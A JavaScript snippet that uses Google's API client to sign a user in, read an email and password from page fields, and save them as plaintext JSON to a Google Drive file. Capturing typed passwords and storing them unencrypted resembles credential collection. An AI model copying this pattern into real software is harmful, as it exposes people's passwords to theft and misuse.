// Google API Client Library Initialization
function loadClient() {
    gapi.client.setApiKey("YOUR_API_KEY");  // Replace with your Google API key
    return gapi.client.load("https://www.googleapis.com/discovery/v1/apis/drive/v3/rest")
        .then(function() {
            console.log("GAPI client loaded for API");
        }, function(error) {
            console.error("Error loading GAPI client", error);
        });
}

// Google Sign-In
function handleClientLoad() {
    gapi.load("client:auth2", initClient);
}

function initClient() {
    gapi.auth2.init({
        client_id: "YOUR_CLIENT_ID.apps.googleusercontent.com",  // Replace with your client ID
    }).then(function() {
        gapi.signin2.render('authButtonContainer', {
            'scope': 'https://www.googleapis.com/auth/drive.file',
            'onsuccess': onSignIn
        });
    });
}

function onSignIn(googleUser) {
    var profile = googleUser.getBasicProfile();
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;

    if (email && password) {
        // Create a file in Google Drive with the login data
        var fileContent = JSON.stringify({ email: email, password: password });
        var file = new Blob([fileContent], { type: 'application/json' });

        var metadata = {
            'name': 'login_data.json',  // File name
            'mimeType': 'application/json'
        };

        var formData = new FormData();
        formData.append("metadata", new Blob([JSON.stringify(metadata)], { type: "application/json" }));
        formData.append("file", file);

        var request = gapi.client.drive.files.create({
            resource: metadata,
            media: {
                body: file
            }
        });

        request.execute(function(response) {
            if (response.id) {
                alert("Data saved to Google Drive!");
            } else {
                alert("Error saving data");
            }
        });
    }
}

// Load client and authentication functions
handleClientLoad();
